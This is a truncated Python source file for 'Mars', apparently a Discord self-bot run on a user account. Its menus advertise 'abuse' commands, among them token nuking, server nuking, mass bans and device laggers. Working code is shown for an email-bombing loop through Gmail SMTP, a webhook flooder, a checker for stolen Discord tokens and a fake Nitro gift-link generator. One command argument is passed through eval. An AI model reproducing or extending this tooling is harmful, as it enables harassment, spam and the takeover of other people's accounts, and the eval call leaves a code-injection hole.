# coding=utf8

connected = False
print("Loading...")
print("Loading imports...")
import re
import sys
import os
import io
import json
import time
import socket
import random
import urllib
import string
import aiohttp
import smtplib
import discord
import asyncio
import requests
import datetime
import platform
import threading
import discord.guild
import translators as ts
from random import randint
from itertools import cycle
from colorama import Fore, init
from discord.ext import commands
from unshortenit import UnshortenIt
from bs4 import BeautifulSoup as bs4
from discord.ext.commands import bot, CommandNotFound
from discord_webhook import DiscordWebhook, DiscordEmbed

from discord.utils import get

print("Imports loaded.")

with open('data/configurations/configsettings.json', 'r') as configsettings:
    configsettings = json.load(configsettings)
    config_name = (configsettings["config_name"])

# Config
try:
    with open('data/configurations/' + config_name + '.json', 'r') as settings:
        config = json.load(settings)
        token = (config["token"])

        color = (config["color"])
        errorcolor = (config["error-color"])

        prefix = (config["prefix"])

        streamurl = (config["stream-url"])

        deletetimer = (config["delete-timer"])

        nitrosniper = (config["nitro-sniper"])
        nitrosniperredeem = (config["nitro-redeem-token"])
        giveawaysniper = (config["giveaway-sniper"])
        giveawaysniperdelay = (config["giveaway-sniper-delay"])
        deletedmessagelogger = (config["deleted-message-logger"])

        gmailaccount = (config["gmail-account"])
        gmailaccountpassword = (config["gmail-password"])

        title = (config["title"])

        helpcommandemoji = (config["emoji"])

        helpimage = (config["help-image"])
        helpthumbnail = (config["help-thumbnail"])

        mainimage = (config["main-image"])
        mainthumbnail = (config["main-thumbnail"])

        accountimage = (config["account-image"])
        accountthumbnail = (config["account-thumbnail"])

        networkingimage = (config["networking-image"])
        networkingthumbnail = (config["networking-thumbnail"])

        funimage = (config["fun-image"])
        funthumbnail = (config["fun-thumbnail"])

        abuseimage = (config["abuse-image"])
        abusethumbnail = (config["abuse-thumbnail"])

        cringeimage = (config["cringe-image"])
        cringethumbnail = (config["cringe-thumbnail"])

        privateimage = (config["private-image"])
        privatethumbnail = (config["private-thumbnail"])

        commandwebhook = (config["webhook"])
        helptextbold = (config["help-text-bold"])
except:
    print("There was an error loading this config, booting to default")
    time.sleep(3)
    with open("data/configurations/configsettings.json", "r") as f:
        config = json.load(f)
    config[str("config_name")] = "default"
    with open("data/configurations/configsettings.json", "w") as f:
        json.dump(config, f, indent=4)
    os.system("python3 Mars.py")

# footer establishment
footer = "Made by Flairings#0608"

# name establishment
name = "Mars"

# Console color establishment
consolecolor = Fore.LIGHTRED_EX

# Colorama autoreset
init(autoreset=True)

# Time establishment
t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
start_time = time.time()

# export friends depend
encoding = sys.stdout.encoding

# Version establishment
version = "2.8.6"

# @bot.command amount establishment
amountofcommands = 105

# Bot establishment
bot = commands.Bot(description="Very cute self-bot | Made by Flairings#0608", command_prefix=prefix, self_bot=True)

if nitrosniper == "true":
    if nitrosniperredeem == "":
        nitrosniperredeem = token
    else:
        headers = {'Content-Type': 'application/json', 'authorization': nitrosniperredeem}
        url = 'https://discordapp.com/api/v6/users/@me/library'
        re = requests.get(url, headers=headers)
        if re.status_code == 200:
            pass
        else:
            print("Nitro sniper redeem token is invalid.")
            exit(0)

# login thing innit
def login():
    try:
        bot.run(token, bot=False)
    except discord.errors.LoginFailure as tokenerror:
        print(consolecolor + "Status: " + Fore.RED + "DISCONNECTED")
        connectionerrorprint("A fatal error has occurred, check your token")

def restartbot():
    os.system("python3 Mars.py")

# Removes default help command
bot.remove_command('help')

# connection establishment
connected = True

# Boolean for user relationship logging
logrelationships = True

def eventprint(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.BLUE + "[Event]" + Fore.LIGHTWHITE_EX + " | " + message)
    if commandwebhook != "":
        webhook = DiscordWebhook(url=commandwebhook)
        embed = DiscordEmbed(title=f'[EVENT]', description=f""
                                                           f"{message}"
                                                           f"", color=3778303)
        embed.set_footer(text="Mars | Logged in as: " + bot.user.name)
        webhook.add_embed(embed)
        response = webhook.execute()

def eventprintnowebhook(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.BLUE + "[Event]" + Fore.LIGHTWHITE_EX + " | " + message)

def commandprint(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.YELLOW + "[Command]" + Fore.LIGHTWHITE_EX + " | " + message)
    if commandwebhook != "":
        webhook = DiscordWebhook(url=commandwebhook)
        embed = DiscordEmbed(title=f'[COMMAND]', description=f""
                                                             f"{message}"
                                                             f"", color=16773456)
        embed.set_footer(text="Mars | Logged in as: " + bot.user.name)
        webhook.add_embed(embed)
        response = webhook.execute()

def errorprint(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.RED + "[Error]" + Fore.LIGHTWHITE_EX + " | " + message)
    if commandwebhook != "":
        webhook = DiscordWebhook(url=commandwebhook)
        embed = DiscordEmbed(title=f'[ERROR]', description=f""
                                                           f"{message}"
                                                           f"", color=16727357)
        embed.set_footer(text="Mars | Logged in as: " + bot.user.name)
        webhook.add_embed(embed)
        response = webhook.execute()

def errorprintnowebhook(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.RED + "[Error]" + Fore.LIGHTWHITE_EX + " | " + message)

def sniperprint(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.GREEN + "[Sniper]" + Fore.LIGHTWHITE_EX + " | " + message)
    if commandwebhook != "":
        webhook = DiscordWebhook(url=commandwebhook)
        embed = DiscordEmbed(title=f'[SNIPER]', description=f""
                                                            f"{message}"
                                                            f"", color=917248)
        embed.set_footer(text="Mars | Logged in as: " + bot.user.name)
        webhook.add_embed(embed)
        response = webhook.execute()

def connectionerrorprint(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.RED + "[Connection Error]" + Fore.LIGHTWHITE_EX + " | " + message)
    if commandwebhook != "":
        webhook = DiscordWebhook(url=commandwebhook)
        embed = DiscordEmbed(title=f'[CONNECTION ERROR]', description=f""
                                                                      f"{message}"
                                                                      f"", color=14221312)
        embed.set_footer(text="Mars | FAILED TO GET USERNAME")
        webhook.add_embed(embed)
        response = webhook.execute()

def tokenprint(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.LIGHTRED_EX + "[Token]" + Fore.LIGHTWHITE_EX + " | " + message)
    if commandwebhook != "":
        webhook = DiscordWebhook(url=commandwebhook)
        embed = DiscordEmbed(title=f'[TOKEN]', description=f""
                                                           f"{message}"
                                                           f"", color=16727357)
        embed.set_footer(text="Mars | Logged in as: " + bot.user.name)
        webhook.add_embed(embed)
        response = webhook.execute()

def warningprint(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.LIGHTYELLOW_EX + "[Warning]" + Fore.LIGHTWHITE_EX + " | " + message)
    if commandwebhook != "":
        webhook = DiscordWebhook(url=commandwebhook)
        embed = DiscordEmbed(title=f'[WARNING]', description=f""
                                                             f"{message}"
                                                             f"", color=16745506)
        embed.set_footer(text="Mars | Logged in as: " + bot.user.name)
        webhook.add_embed(embed)
        response = webhook.execute()

def detection(message):
    print(Fore.LIGHTWHITE_EX + current_time + " | " + Fore.RED + "[Detection]" + Fore.LIGHTWHITE_EX + " | " + message)
    if commandwebhook != "":
        webhook = DiscordWebhook(url=commandwebhook)
        embed = DiscordEmbed(title=f'[DETECTION]', description=f""
                                                             f"{message}"
                                                             f"", color=14155776)
        embed.set_footer(text="Mars | Logged in as: " + bot.user.name)
        webhook.add_embed(embed)
        response = webhook.execute()

@bot.event
async def on_connect():
    if connected:
        print("")
        print(Fore.LIGHTWHITE_EX + "- - - - " + Fore.LIGHTRED_EX + "Mars" + Fore.LIGHTWHITE_EX + " - - - -")
        print(Fore.LIGHTRED_EX + "Status: " + Fore.GREEN + "CONNECTED")
        print(Fore.LIGHTRED_EX + "Account: " + Fore.LIGHTWHITE_EX + bot.user.name)
        print(Fore.LIGHTRED_EX + "ID: " + Fore.LIGHTWHITE_EX + str(bot.user.id))
        print(Fore.LIGHTRED_EX + "Server-Count: " + Fore.LIGHTWHITE_EX + "" + str(len(bot.guilds)) + "")
        if nitrosniper == "true":
            print(Fore.LIGHTRED_EX + "Nitro-Sniper: " + Fore.GREEN + "Enabled")
        else:
            print(Fore.LIGHTRED_EX + "Nitro-Sniper: " + Fore.RED + "Disabled")

        if giveawaysniper == "true":
            print(Fore.LIGHTRED_EX + "Giveaway-Sniper: " + Fore.GREEN + "Enabled")
        else:
            print(Fore.LIGHTRED_EX + "Giveaway-Sniper: " + Fore.RED + "Disabled")
    else:
        print("Status: " + Fore.RED + "DISCONNECTED")

    if connected:
        eventprint("Mars is now online")
    else:
        connectionerrorprint("A fatal error has occurred")
        await bot.logout()
        input("Press enter key to continue")

@bot.event
async def on_relationship_remove(relationship):
    if logrelationships:
        if relationship.user.name != bot.user.name:
            eventprint(f"relationship has been ended between {bot.user.name} and {relationship.user.name}")

@bot.event
async def on_relationship_add(relationship):
    if logrelationships:
        if relationship.user.name != bot.user.name:
            eventprint(f"relationship has been started between {bot.user.name} and {relationship.user.name}")

@bot.event
async def on_message_delete(message):
    if deletedmessagelogger == "true":
        guild = message.guild
        if not guild:
            if message.author.id != bot.user.id:
                eventprint(f'{message.author} deleted a message | Channel: {message.channel} | Message: {message.content}')

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, CommandNotFound):
        commandprint("User has executed an invalid command".format(error))
        em = discord.Embed(title="Command is invalid.", color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)
        return
    elif isinstance(error, commands.CheckFailure):
        commandprint("User is missing permissions to execute this command".format(error))
        em = discord.Embed(title="Invalid permissions to execute this command.", color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)
        return
    raise error

@bot.command(aliases=['help'])
async def mars(ctx):
    await ctx.message.delete()
    commandprint("Command 'help' has been used by " + bot.user.name)
    embed = discord.Embed(title="", description=title + " \n", color=color)
    if helptextbold == "true":
        embed = discord.Embed(title="", description=title + " \n", color=color)
        embed.add_field(name=f"**{helpcommandemoji} | Main**", value="**Main Commands** \n", inline=False)
        embed.add_field(name=f"**{helpcommandemoji} | Account**", value="**Account Commands** \n", inline=False)
        embed.add_field(name=f"**{helpcommandemoji} | Fun**", value="**Fun Commands** \n", inline=False)
        embed.add_field(name=f"**{helpcommandemoji} | Abuse**", value="**Abuse Commands** \n ", inline=False)
        embed.add_field(name=f"**{helpcommandemoji} | Cringe**", value="**Cringe Commands** \n", inline=False)
        embed.set_footer(text=footer)
        embed.set_image(url=helpimage)
        embed.set_thumbnail(url=helpthumbnail)
        await ctx.send("", embed=embed, delete_after=deletetimer)
    else:
        embed = discord.Embed(title="", description=title + " \n", color=color)
        embed.add_field(name=f"**{helpcommandemoji} | Main**", value="Main Commands \n", inline=False)
        embed.add_field(name=f"**{helpcommandemoji} | Account**", value="Account Commands \n", inline=False)
        embed.add_field(name=f"**{helpcommandemoji} | Fun**", value="Fun Commands \n", inline=False)
        embed.add_field(name=f"**{helpcommandemoji} | Abuse**", value="Abuse Commands \n ", inline=False)
        embed.add_field(name=f"**{helpcommandemoji} | Cringe**", value="Cringe Commands \n", inline=False)
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=helpthumbnail)
        embed.set_image(url=helpimage)
        await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def main(ctx):
        await ctx.message.delete()
        commandprint("Command 'main' has been used by " + bot.user.name)
        embed = discord.Embed(title=f"{helpcommandemoji} | Main", description="", color=color, )
        embed.add_field(name="**INFO**", value="information about self-bot \n", inline=False)
        embed.add_field(name="**LOGOUT**", value="Logs you out of the selfbot \n", inline=False)
        embed.add_field(name="**UPTIME**", value="Shows how long the selfbot has been online \n", inline=False)
        embed.add_field(name="**SETEMOJI**", value="changes the emojis in help command, default [優] \n", inline=False)
        embed.add_field(name="**SETTITLE**", value="changes the bot title \n", inline=False)
        embed.add_field(name="**SETPREFIX**", value="changes the bot prefix \n", inline=False)
        embed.add_field(name="**SETCONFIG**", value="changes the bot config \n", inline=False)
        embed.add_field(name="**SETSTREAMURL**", value="changes the stream url \n", inline=False)
        embed.add_field(name="**TOGGLENS**", value="toggles the nitro sniper \n", inline=False)
        embed.add_field(name="**TOGGLEGS**", value="toggles the giveaway sniper \n", inline=False)
        embed.add_field(name="**TOGGLEDML**", value="toggles the deleted message logger \n", inline=False)
        embed.add_field(name="**SETGMAILACCOUNT**", value="changes the gmail address used for gmail spammer \n", inline=False)
        embed.add_field(name="**SETGMAILPASSWORD**", value="changes the gmail password used for gmail spammer \n", inline=False)
        embed.add_field(name="**ASCII**", value="translates text into ascii", inline=False)
        embed.add_field(name="**PING**", value="checks if an ip or host is online", inline=False)
        embed.add_field(name="**IPLOOKUP**", value="gets the data of an ip address", inline=False)
        embed.add_field(name="**RESOLVE**", value="resolves the ip of a domain", inline=False)
        embed.add_field(name="**PORTS**", value="lists known ports of ip addresses", inline=False)
        embed.add_field(name="**GUILDICON**", value="gets the guilds icon", inline=False)
        embed.add_field(name="**EMOJISTEAL**", value="downloads all the emojis in a server", inline=False)
        embed.add_field(name="**USERINFO**", value="displays a users basic info", inline=False)
        embed.add_field(name="**FIRSTMESSAGE**", value="jump to the first message", inline=False)
        embed.add_field(name="**TRANSLATEFROM**", value="translates text into english", inline=False)
        embed.add_field(name="**TRANSLATETO**", value="translates your text into a specific language", inline=False)
        embed.add_field(name="**NAMEMC**", value="displays the info of a minecraft username", inline=False)
        embed.add_field(name="**SPAMWEBHOOK**", value="spams a webhook with a message and an amount", inline=False)
        embed.add_field(name="**TEXTTOBINARY**", value="translates text into binary", inline=False)
        embed.add_field(name="**BINARYTOTEXT**", value="translates binary from text", inline=False)
        embed.add_field(name="**CHECKTOKEN**", value="checks if a token is valid or not", inline=False)
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=mainthumbnail)
        embed.set_image(url=mainimage)
        await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def account(ctx):
        await ctx.message.delete()
        commandprint("Command 'account' has been used by " + bot.user.name)
        embed = discord.Embed(title=f"{helpcommandemoji} | Account", description="status may not work if you already have one", color=color, )
        embed.add_field(name="**HYPESQUAD**", value="change your hypesquad \n", inline=False)
        embed.add_field(name="**EXPORTFRIENDS**", value="prints friends list to console \n", inline=False)
        embed.add_field(name="**AV**", value="get mentioned user profile picture \n", inline=False)
        embed.add_field(name="**STREAM**", value="add a stream status \n", inline=False)
        embed.add_field(name="**GAME**", value="add a game status \n", inline=False)
        embed.add_field(name="**WATCHING**", value="add a watching status \n", inline=False)
        embed.add_field(name="**LISTENING**", value="add a listening status \n", inline=False)
        embed.add_field(name="**CL**", value="clears chat \n", inline=False)
        embed.add_field(name="**ADMINCL**", value="clears chat in servers \n", inline=False)
        embed.add_field(name="**LEAVEALLGROUPS**", value="leave all groups \n", inline=False)
        embed.add_field(name="**TINYURL**", value="jump to the first message", inline=False)
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=accountthumbnail)
        embed.set_image(url=accountimage)
        await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def fun(ctx):
        await ctx.message.delete()
        commandprint("Command 'fun' has been used by " + bot.user.name)
        embed = discord.Embed(title=f"{helpcommandemoji} | Fun", description="", color=color, )
        embed.add_field(name="**EMBED**", value="embeds your chosen message", inline=False)
        embed.add_field(name="**CHANGEMYMIND**", value="displays text on changemymind", inline=False)
        embed.add_field(name="**THREATS**", value="compares an image to other threats", inline=False)
        embed.add_field(name="**MAGIK**", value="warps an image to selected intensity", inline=False)
        embed.add_field(name="**IPHONEX**", value=" view an image on an iphonex", inline=False)
        embed.add_field(name="**DOXBIN**", value="searches something on doxbin", inline=False)
        embed.add_field(name="**PHUB**", value="searches something on pornhub", inline=False)
        embed.add_field(name="**YT**", value="searches something on youtube", inline=False)
        embed.add_field(name="**COVID**", value="shows status of covid-19", inline=False)
        embed.add_field(name="**TOPIC**", value="start a random topic", inline=False)
        embed.add_field(name="**QUESTION**", value="ask a question", inline=False)
        embed.add_field(name="**PENIS**", value="look down a users pants (dodgy)", inline=False)
        embed.add_field(name="**8BALL**", value="get an answer", inline=False)
        embed.add_field(name="**REVERSE**", value="make your text reversed", inline=False)
        embed.add_field(name="**TRUMPTWEET**", value="criminalize mr trump ", inline=False)
        embed.add_field(name="**TWEET**", value="fake tweet with username and message", inline=False)
        embed.add_field(name="**SHIP**", value="ships two names to a percentage", inline=False)
        embed.add_field(name="**GAY**", value="makes a users profile picture gay", inline=False)
        embed.add_field(name="**WASTED**", value="makes a users profile picture wasted from gta", inline=False)
        embed.add_field(name="**LYRICFINDER**", value="finds the lyrics of a song", inline=False)
        embed.add_field(name="**GENPASSWORD**", value="generate a random password", inline=False)
        embed.add_field(name="**FAKENITRO**", value="generate a fake discord nitro code", inline=False)
        embed.add_field(name="**IMG**", value="finds chosen image from the array", inline=False)
        embed.set_footer(text=footer)
        embed.set_thumbnail(url=funthumbnail)
        embed.set_image(url=funimage)
        await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def abuse(ctx):
    await ctx.message.delete()
    commandprint("Command 'abuse' has been used by " + bot.user.name)
    embed = discord.Embed(title=f"{helpcommandemoji} | Abuse", description="", color=color, )
    embed.add_field(name="**TOKENINFO**", value="shows sensitive data from a token", inline=False)
    embed.add_field(name="**NUKETOKEN**", value="Crash, glitch, remove friends of a token", inline=False)
    embed.add_field(name="**BAN**", value="ban an individual user", inline=False)
    embed.add_field(name="**UNBAN**", value="unban an individual user", inline=False)
    embed.add_field(name="**MASSBAN**", value="ban all users", inline=False)
    embed.add_field(name="**MASSUNBAN**", value="unban all users", inline=False)
    embed.add_field(name="**MASSKICK**", value="kicks all users", inline=False)
    embed.add_field(name="**NUKESERVER**", value="destroy entire server", inline=False)
    embed.add_field(name="**BANLIST**", value="display all currently banned users", inline=False)
    embed.add_field(name="**EMOJILAGGER**", value="spams emojies to lag a device", inline=False)
    embed.add_field(name="**ARABLAGGER**", value="spams arabic letters to lag devices", inline=False)
    embed.add_field(name="**CHANNELCRASHER**", value="spams unknown letters to lag devices", inline=False)
    embed.add_field(name="**SPAM**", value="spams chosen phrase", inline=False)
    embed.add_field(name="**GMAILSPAM**", value="spams a gmail with an amount and a message", inline=False)
    embed.set_footer(text=footer)
    embed.set_thumbnail(url=abusethumbnail)
    embed.set_image(url=abuseimage)
    await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def cringe(ctx):
    await ctx.message.delete()
    commandprint("Command 'cringe' has been used by " + bot.user.name)
    embed = discord.Embed(title=f"{helpcommandemoji} | Cringe", description="WARNING: command may not work in dms.", color=color, )
    embed.add_field(name="**KISS**", value="kiss another user", inline=False)
    embed.add_field(name="**CUDDLE**", value="cuddle another user", inline=False)
    embed.add_field(name="**PAT**", value="pat another user", inline=False)
    embed.add_field(name="**TICKLE**", value="tickle another user", inline=False)
    embed.add_field(name="**SLAP**", value="slap another user", inline=False)
    embed.add_field(name="**LESBIAN**", value="get lesbian shit", inline=False)
    embed.add_field(name="**LEWD**", value="get lewd images and gifs", inline=False)
    embed.add_field(name="**BLOWJOB**", value="you can imagine", inline=False)
    embed.add_field(name="**TITS**", value="at this point i don't need to explain", inline=False)
    embed.add_field(name="**BOOBS**", value="not explaining anymore", inline=False)
    embed.add_field(name="**HENTAI**", value="fuck off", inline=False)
    embed.set_footer(text=footer)
    embed.set_thumbnail(url=cringethumbnail)
    embed.set_image(url=cringeimage)
    await ctx.send("", embed=embed, delete_after=deletetimer)

@bot.command()
async def setconfig(ctx, configname = None):
    await ctx.message.delete()
    commandprint("Command 'setconfig' has been used by " + bot.user.name)
    if configname is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a configname \n"
                                                                     "Example: " + prefix + "setconfig default", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            if os.path.exists("data/configurations/" + configname + ".json"):
                with open("data/configurations/configsettings.json", "r") as f:
                    config = json.load(f)
                config[str("config_name")] = configname
                with open("data/configurations/configsettings.json", "w") as f:
                    json.dump(config, f, indent=4)
                eventprint("Configuration has been set to " + configname)
                embed = discord.Embed(title="CONFIGURATION CHANGED", description=f"Configuration is now '{configname}'. \n Restart the bot in order for changes to take place.", color=color)
                embed.set_footer(text=footer)
                await ctx.send(embed=embed, delete_after=deletetimer)
            else:
                eventprint("Configuration not found.")
                embed = discord.Embed(title="CONFIGURATION", description=f"Could not find configuration with that name.", color=color)
                embed.set_footer(text=footer)
                await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def fakenitro(ctx):
    await ctx.message.delete()
    commandprint("Command 'fakenitro' has been used by " + bot.user.name)
    try:
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        await ctx.send("https://discord.gift/" + code)
    except Exception as error:
        errorprint("Exception ' {0} ', unknown error ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: unknown error \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

# NOT FINISHED
@bot.command()
async def noleave(ctx, user: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'noleave' has been used by " + bot.user.name)
    try:
        #codeee !
        print("d")
    except Exception as error:
        errorprint("Exception ' {0} ', unknown error ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: unknown error \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)


@bot.command()
async def genpassword(ctx):
    await ctx.message.delete()
    commandprint("Command 'genpassword' has been used by " + bot.user.name)
    try:
        alphabet = "abcdefghijklmnopqrstuvwxyz"
        upperalphabet = alphabet.upper()
        pw_len = 16
        pwlist = []

        for i in range(pw_len//3):
            pwlist.append(alphabet[random.randrange(len(alphabet))])
            pwlist.append(upperalphabet[random.randrange(len(upperalphabet))])
            pwlist.append(str(random.randrange(16)))

        for i in range(pw_len-len(pwlist)):
                pwlist.append(alphabet[random.randrange(len(alphabet))])

        random.shuffle(pwlist)
        pwstring = "".join(pwlist)
        embed = discord.Embed(title=f"**PASSWORD GENERATED**", description="Your generated password is " + pwstring + "", color=color)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', unknown error ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: unknown error \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def checktoken(ctx, *, token = None):
    await ctx.message.delete()
    commandprint("Command 'checktoken' has been used by " + bot.user.name)
    if token is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a token \n"
                                                                     "Example: " + prefix + "checktoken token", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            headers = {'Content-Type': 'application/json', 'authorization': token}
            url = 'https://discordapp.com/api/v6/users/@me/library'
            re = requests.get(url, headers=headers)
            if re.status_code == 200:
                embed = discord.Embed(title=f"**TOKEN CHECKER**", color=color)
                embed.add_field(name="**TOKEN VALID.**", value="This token is valid, meaning you can login or use commands against the token \n", inline=False)
                embed.set_footer(text=footer)
                await ctx.send(embed=embed, delete_after=deletetimer)
            else:
                embed = discord.Embed(title=f"**TOKEN CHECKER**", color=color)
                embed.add_field(name="**TOKEN INVALID.**", value="The token has either been disabled, or the password is changed \n", inline=False)
                embed.set_footer(text=footer)
                await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', argument error ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: argument error \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def gmailspam(ctx, target = None, counter: eval = None, *, message = None):
    await ctx.message.delete()
    if target is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a target \n"
                                                                     "Example: " + prefix + "gmailspam mars@gmail.com 50 wag1", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif counter is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a counter \n"
                                                                     "Example: " + prefix + "gmailspam mars@gmail.com 50 wag1", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif message is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a message \n"
                                                                     "Example: " + prefix + "gmailspam mars@gmail.com 50 wag1", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            _smpt = smtplib.SMTP('smtp.gmail.com', 587)
            _smpt.starttls()
            try:
                _smpt.login(gmailaccount, gmailaccountpassword)
            except:
                errorprint(f"Incorrect Password or gmail account, make sure you've enabled less-secure apps access"+Fore.RESET)
                embed = discord.Embed(title=f"**ERROR:**", color=color)
                embed.add_field(name="**Incorrect Password or gmail account**", value="make sure you've enabled less-secure apps access \n", inline=False)
                embed.set_footer(text=footer)
                await ctx.send(embed=embed, delete_after=deletetimer)
            else:
                count = 0
                embed=discord.Embed(title=f"**EMAIL SPAMMER**", color=color)
                embed.add_field(name="**SPAMMING**", value=target + " \n", inline=False)
                embed.add_field(name="**AMOUNT**", value=(str(counter)) + " \n", inline=False)
                embed.add_field(name="**MESSAGE**", value=message + " \n", inline=False)
                embed.set_footer(text=footer)
                await ctx.send(embed=embed, delete_after=deletetimer)
                while count < counter:
                    _smpt.sendmail(gmailaccount, target, message)
                    count += 1
                    eventprintnowebhook("Gmail Spammer | Email sent, total " + (str(count)))
                if count == counter:
                    embed = discord.Embed(title=f"**EMAIL SPAMMER | PROCESS COMPLETE**", color=color)
                    embed.set_footer(text=footer)
                    await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Invalid email?, Invalid Logins? ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid email?, Invalid Logins? \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def ship(ctx, name1 = None, name2 = None):
    await ctx.message.delete()
    commandprint("Command 'ship' has been used by " + bot.user.name)
    if name1 is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a name1 \n"
                                                                     "Example: " + prefix + "ship flairings culur", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif name2 is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a name2 \n"
                                                                     "Example: " + prefix + "ship flairings culur", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            name1letters = name1[:round(len(name1) / 2)]
            name2letters = name2[round(len(name2) / 2):]
            shippedname = "".join([name1letters, name2letters])
            randomvalue = randint(1, 100)
            embed=discord.Embed(title=f"**:heart: MATCHMAKING** :heart:", description=f":small_red_triangle_down: {name1} \n"
                                                                                      f" :small_red_triangle: {name2} \n \n"
                                                                                      f":twisted_rightwards_arrows: **{shippedname}** \n"
                                                                                      f"**{randomvalue}%** Match", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', User not found ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def spamwebhook(ctx, spamwebhook = None, amount = None, *, message = None):
    commandprint("Command 'spamwebhook' has been used by " + bot.user.name)
    if spamwebhook is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a spamwebhook \n"
                                                                     "Example: " + prefix + "spamwebhook link 5 hello sir", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif amount is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a amount \n"
                                                                     "Example: " + prefix + "spamwebhook link 5 hello sir", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif message is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a message \n"
                                                                     "Example: " + prefix + "spamwebhook link 5 hello sir", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            embed=discord.Embed(title=f"**SPAMMING WEBHOOK**", color=color)
            embed.add_field(name="**SPAMMING**", value=spamwebhook + " \n", inline=False)
            embed.add_field(name="**AMOUNT**", value=(str(amount)) + " \n", inline=False)
            embed.add_field(name="**MESSAGE**", value=message + " \n", inline=False)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)

            webhook = DiscordWebhook(url=spamwebhook, content=message)
            for _ in range((int(amount))):
                await asyncio.sleep(0.20)
                sent_webhook = webhook.execute()
        except Exception as error:
            errorprint("Exception ' {0} ', Webhook not found ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Webhook not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

# fun fact
# listening to Baby by justin bieber rn. slaps.

@bot.command()
async def namemc(ctx, username = None):
    await ctx.message.delete()
    commandprint("Command 'namemc' has been used by " + bot.user.name + " with a username of '" + username + "'")
    if username is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a username \n"
                                                                     "Example: " + prefix + "namemc culur", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
